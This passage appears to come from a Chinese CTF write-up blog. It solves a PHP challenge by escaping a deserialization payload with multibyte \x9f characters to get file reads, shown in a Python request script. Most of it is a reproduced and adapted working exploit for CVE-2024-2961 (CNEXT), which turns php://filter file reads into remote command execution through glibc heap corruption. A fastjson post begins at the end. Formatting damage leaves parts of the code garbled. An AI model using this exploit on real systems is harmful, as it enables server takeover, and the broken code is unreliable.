<p>结果尝试发现mb_strpos会直接忽略<code>\x9f</code>但是mb_substr会将其解析为一个字符。</p>
<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>我们解析链的构造方法首先我们肯定是要构造任意文件读取了。但是我们查看代码会发现其可控的只有read和<code>$_GET[&#39;start&#39;]</code>即<code>$start</code><br>我们想要反序列话的链子应该如下<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>，我们需要使用上面提到的宽字符逃逸的方法来将我们构造的链子逃逸出去。我们将链子直接赋值给start得到的<code>$ctf</code>为<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:75:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>更加我们上面提到的每增加一个<code>\xF0\x9F\xF0\x9F</code>后续字符在经过处理后就会被吞掉一个字符。那么我们只要在<code>[</code>前面加上37个<code>\xF0\x9F\xF0\x9F</code>就可使得<code>$ctf</code>变为<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;]</code>即我们将链子逃逸了出去。<br>所以只要给read传37个<code>\xF0\x9F\xF0\x9F</code>即可逃逸成功。</p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>通过%9f也可以来构造链子<br>同样我们要构造<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>其但是由于%9f会使得截取范围算是前移。即如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\x9f\x9f\x9f\x9f\x9f1111[aaaa]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">1111</span><br></pre></td></tr></table></figure><br>假设1111为我们要使用的payload，那么我们可以发现只要将截取的内容前移payload长度+1个字符就可以成功逃逸，二括号内的内容长度要大于payload的长度。<br>即我们可以构造如下脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">path=<span class="string">&quot;/etc/hosts&quot;</span></span><br><span class="line">payload_file=<span class="string">&#x27;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(path))+<span class="string">&#x27;:&quot;&#x27;</span>+path+<span class="string">&#x27;&quot;;&#125;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;%9f&#x27;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">1</span>)+payload_file.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">start=<span class="string">&quot;a&quot;</span>*(<span class="built_in">len</span>(payload_file)+<span class="number">11</span>)</span><br><span class="line">url=<span class="string">&quot;https://d34019c5-7d46-48e6-bed4-de3459da6865.challenge.ctf.show/&quot;</span>+<span class="string">f&quot;?start=<span class="subst">&#123;start&#125;</span>&amp;read=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">req=requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(req.text</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>但是虽然可以文件读取但是并不知道文件的名字为什么。所以我们需要rce</p>
<h2 id="CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行"><a href="#CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行" class="headerlink" title="CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行"></a>CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行</h2><p>参考:<br><a href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p>
<p>原作者给出的exp:<br><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p>
<p>因为这个是利用了glibc的我不懂应该是属于pwn的范围的所以我就当个脚本小子即可</p>
<p>虽然有exp但是我们还需要进行小小的修改如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ```php</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">    echo &quot;File contents: $data&quot;;</span></span><br></pre></td></tr></table></figure></p>
<pre><code>Tweak it to fit your target, and start the exploit.
&quot;&quot;&quot;

def __init__(self, url: str) -&gt; None:
    self.url = url
    self.session = Session()

def send(self, path: str) -&gt; Response:
    &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.
    &quot;&quot;&quot;
    payload_file = &#39;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:&#39; + str(len(path)) + &#39;:&quot;&#39; + path + &#39;&quot;;&#125;&#39;
    payload = &quot;%9f&quot; * (len(payload_file) + 1) + payload_file.replace(&quot;+&quot;,&quot;%2b&quot;)
    filename_len = &quot;a&quot; * (len(path) + 10)
    url = self.url+f&quot;?start=&#123;filename_len&#125;&amp;read=&#123;payload&#125;&quot;
    return self.session.get(url)

def download(self, path: str) -&gt; bytes:
    &quot;&quot;&quot;Returns the contents of a remote file.
    &quot;&quot;&quot;
    path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;
    response = self.send(path)
    data = response.re.search(b&quot;What you are reading is:(.*)&quot;, flags=re.S).group(1)
    return base64.decode(data)
</code></pre><p>@entry<br>@arg(“url”, “Target URL”)<br>@arg(“command”, “Command to run on the system; limited to 0x140 bytes”)<br>@arg(“sleep_time”, “Time to sleep to assert that the exploit worked. By default, 1.”)<br>@arg(“heap”, “Address of the main zend_mm_heap structure.”)<br>@arg(<br>    “pad”,<br>    “Number of 0x100 chunks to pad with. If the website makes a lot of heap “<br>    “operations with this size, increase this. Defaults to 20.”,<br>)<br>@dataclass<br>class Exploit:<br>    “””CNEXT exploit: RCE using a file read primitive in PHP.”””</p>
<pre><code>url: str
command: str
sleep: int = 1
heap: str = None
pad: int = 20

def __post_init__(self):
    self.remote = Remote(self.url)
    self.log = logger(&quot;EXPLOIT&quot;)
    self.info = &#123;&#125;
    self.heap = self.heap and int(self.heap, 16)

def check_vulnerable(self) -&gt; None:
    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
    wrappers and filters that the exploit needs.
    &quot;&quot;&quot;

    def safe_download(path: str) -&gt; bytes:
        try:
            return self.remote.download(path)
        except ConnectionError:
            failure(&quot;Target not [b]reachable[/] ?&quot;)

    def check_token(text: str, path: str) -&gt; bool:
        result = safe_download(path)
        return text.encode() == result

    text = tf.random.string(50).encode()
    base64 = b64(text, misalign=True).decode()
    path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;

    result = safe_download(path)

    if text not in result:
        msg_failure(&quot;Remote.download did not return the test string&quot;)
        print(&quot;--------------------&quot;)
        print(f&quot;Expected test string: &#123;text&#125;&quot;)
        print(f&quot;Got: &#123;result&#125;&quot;)
        print(&quot;--------------------&quot;)
        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]data://[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(text.encode(), misalign=True).decode()
    path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;
    if not check_token(text, path):
        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(compress(text.encode()), misalign=True).decode()
    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;

    if not check_token(text, path):
        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)

    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)

    msg_success(&quot;Exploit preconditions are satisfied&quot;)

def get_file(self, path: str) -&gt; bytes:
    with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):
        return self.remote.download(path)

def get_regions(self) -&gt; list[Region]:
    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
    maps = self.get_file(&quot;/proc/self/maps&quot;)
    maps = maps.decode()
    PATTERN = re.compile(
        r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if &quot;/&quot; in path or &quot;[&quot; in path:
                path = path.rsplit(&quot; &quot;, 1)[-1]
            else:
                path = &quot;&quot;
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            failure(&quot;Unable to parse memory mappings&quot;)

    self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)

    return regions

def get_symbols_and_addresses(self) -&gt; None:
    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
    regions = self.get_regions()

    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;

    # PHP&#39;s heap

    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)

    # Libc

    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)

    self.download_file(libc.path, LIBC_FILE)

    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
    self.info[&quot;libc&quot;].address = libc.start

def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure(&quot;Unable to locate region&quot;)

    return region

def download_file(self, remote_path: str, local_path: str) -&gt; None:
    &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;
    data = self.get_file(remote_path)
    Path(local_path).write(data)

def find_main_heap(self, regions: list[Region]) -&gt; Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == &quot;rw-p&quot;
        and region.size &gt;= HEAP_SIZE
        and region.stop &amp; (HEAP_SIZE - 1) == 0
        and region.path == &quot;&quot;
    ]

    if not heaps:
        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)

    first = heaps[0]

    if len(heaps) &gt; 1:
        heaps = &quot;, &quot;.join(map(hex, heaps))
        msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)
    else:
        msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)

    return first

def run(self) -&gt; None:
    self.check_vulnerable()
    self.get_symbols_and_addresses()
    self.exploit()

def build_exploit_path(self) -&gt; str:
    &quot;&quot;&quot;

    On each step of the exploit, a filter will process each chunk one after the
    other. Processing generally involves making some kind of operation either
    on the chunk or in a destination chunk of the same size. Each operation is
    applied on every single chunk; you cannot make PHP apply iconv on the first 10
    chunks and leave the rest in place. That&#39;s where the difficulties come from.

    Keep in mind that we know the address of the main heap, and the libraries.
    ASLR/PIE do not matter here.

    The idea is to use the bug to make the freelist for chunks of size 0x100 point
    lower. For instance, we have the following free list:

    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00

    By triggering the bug from chunk ..900, we get:

    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???

    That&#39;s step 3.

    Now, in order to control the free list, and make it point whereever we want,
    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
    That&#39;s step 2.

    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
    a problem: after step2 has been processed, the free list goes bottom-up, like:

    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900

    We need to go the other way around. That&#39;s why we have step 1: it just allocates
    chunks. When they get freed, they reverse the free list. Now step2 allocates in
    reverse order, and therefore after step2, chunks are in the correct order.

    Another problem comes up.

    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
    Since step2 creates chunks that contain pointers and pointers are generally not
    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
    To avoid this, we put the chunks in step2 at the very end of the chain, and
    prefix them with `0\n`. When dechunked (right before the iconv), they will
    &quot;disappear&quot; from the chain, preserving them from the character set conversion
    and saving us from an unwanted processing error that would stop the processing
    chain.

    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
    don&#39;t know the precise layout of the heap, but we know that at the top of the
    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
    Its free_slot[] array contains a pointer to each free list. By overwriting it,
    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
    field contains pointers to hook functions for emalloc, efree, and erealloc
    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
    then overwrite the use_custom_heap flag to make PHP use these function pointers
    instead. We can now do our favorite CTF technique and get a call to
    system(&lt;chunk&gt;).
    We make sure that the &quot;system&quot; command kills the current process to avoid other
    system() calls with random chunk data, leading to undefined behaviour.

    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
    process is in a random state, we still get contiguous, in order chunks for our
    exploit.

    Therefore, the whole process described here CANNOT crash. Everything falls
    perfectly in place, and nothing can get in the middle of our allocations.
    &quot;&quot;&quot;

    LIBC = self.info[&quot;libc&quot;]
    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]

    ADDR_HEAP = self.info[&quot;heap&quot;]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b&quot;\x00&quot; * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b&quot;\x00&quot; * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;

    step2_size = 0x48
    step2 = b&quot;\x00&quot; * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b&quot;\x00&quot; * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap-&gt;free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = self.command
    COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;
    if self.sleep:
        COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;
    COMMAND = COMMAND.encode() + b&quot;\x00&quot;

    assert (
            len(COMMAND) &lt;= step4_use_custom_heap_size
    ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;

    filters = [
        # Create buckets
        &quot;zlib.inflate&quot;,
        &quot;zlib.inflate&quot;,

        # Step 0: Setup heap
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 1: Reverse FL order
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 2: Put fake pointer and make FL order back to normal
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,

        # Step 3: Trigger overflow
        &quot;dechunk&quot;,
        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,

        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        &quot;convert.quoted-printable-decode&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
    ]
    filters = &quot;|&quot;.join(filters)
    path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;

    return path

@inform(&quot;Triggering...&quot;)
def exploit(self) -&gt; None:
    path = self.build_exploit_path()
    start = time.time()

    try:
        self.remote.send(path)
    except (ConnectionError, ChunkedEncodingError):
        pass

    msg_print()

    if not self.sleep:
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
    elif start + self.sleep &lt;= time.time():
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
    else:
        # Wrong heap, maybe? If the exploited suggested others, use them!
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)

    msg_print()
</code></pre><p>def compress(data) -&gt; bytes:<br>    “””Returns data suitable for <code>zlib.inflate</code>.<br>    “””</p>
<pre><code># Remove 2-byte header and 4-byte checksum
return zlib.compress(data, 9)[2:-4]
</code></pre><p>def b64(data: bytes, misalign=True) -&gt; bytes:<br>    payload = base64.encode(data)<br>    if not misalign and payload.endswith(“=”):<br>        raise ValueError(f”Misaligned: {data}”)<br>    return payload.encode()</p>
<p>def compressed_bucket(data: bytes) -&gt; bytes:<br>    “””Returns a chunk of size 0x8000 that, when dechunked, returns the data.”””<br>    return chunked_chunk(data, 0x8000)</p>
<p>def qpe(data: bytes) -&gt; bytes:<br>    “””Emulates quoted-printable-encode.<br>    “””<br>    return “”.join(f”={x:02x}” for x in data).upper().encode()</p>
<p>def ptr_bucket(<em>ptrs, size=None) -&gt; bytes:<br>    “””Creates a 0x8000 chunk that reveals pointers after every step has been ran.”””<br>    if size is not None:<br>        assert len(ptrs) </em> 8 == size<br>    bucket = b””.join(map(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)</p>
<pre><code>return bucket
</code></pre><p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes:<br>    “””Constructs a chunked representation of the given chunk. If size is given, the<br>    chunked representation has size <code>size</code>.<br>    For instance, <code>ABCD</code> with size 10 becomes: <code>0004\nABCD\n</code>.<br>    “””</p>
<pre><code># The caller does not care about the size: let&#39;s just add 8, which is more than
# enough
if size is None:
    size = len(data) + 8
keep = len(data) + len(b&quot;\n\n&quot;)
size = f&quot;&#123;len(data):x&#125;&quot;.rjust(size - keep, &quot;0&quot;)
return size.encode() + b&quot;\n&quot; + data + b&quot;\n&quot;
</code></pre><p>@dataclass<br>class Region:<br>    “””A memory region.”””</p>
<pre><code>start: int
stop: int
permissions: str
path: str

@property
def size(self) -&gt; int:
    return self.stop - self.start
</code></pre><p>Exploit()<br>```<br>#</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson反序列化</title>
    <url>/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="本人最近这段时间才开始学java，如有出错请各位大佬指正"><a href="#本人最近这段时间才开始学java，如有出错请各位大佬指正" class="headerlink" title="本人最近这段时间才开始学java，如有出错请各位大佬指正"></a>本人最近这段时间才开始学java，如有出错请各位大佬指正</h1><h1 id="fastJson反序列化其实应该分为两种-一种是通过JSON-parse-payload-时调用了本地类中的setter法从而导致的命令指向。第二种就是fastJson的原生反序列化了，即readObject触发的反序列化，这篇文章我先写一下第一种的"><a href="#fastJson反序列化其实应该分为两种-一种是通过JSON-parse-payload-时调用了本地类中的setter法从而导致的命令指向。第二种就是fastJson的原生反序列化了，即readObject触发的反序列化，这篇文章我先写一下第一种的" class="headerlink" title="fastJson反序列化其实应该分为两种,一种是通过JSON.parse(payload);时调用了本地类中的setter法从而导致的命令指向。第二种就是fastJson的原生反序列化了，即readObject触发的反序列化，这篇文章我先写一下第一种的"></a>fastJson反序列化其实应该分为两种,一种是通过JSON.parse(payload);时调用了本地类中的setter法从而导致的命令指向。第二种就是fastJson的原生反序列化了，即readObject触发的反序列化，这篇文章我先写一下第一种的</h1><h1 id="fastJson的基础使用方法与一些特性的介绍"><a href="#fastJson的基础使用方法与一些特性的介绍" class="headerlink" title="fastJson的基础使用方法与一些特性的介绍"></a>fastJson的基础使用方法与一些特性的介绍</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;有参&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span 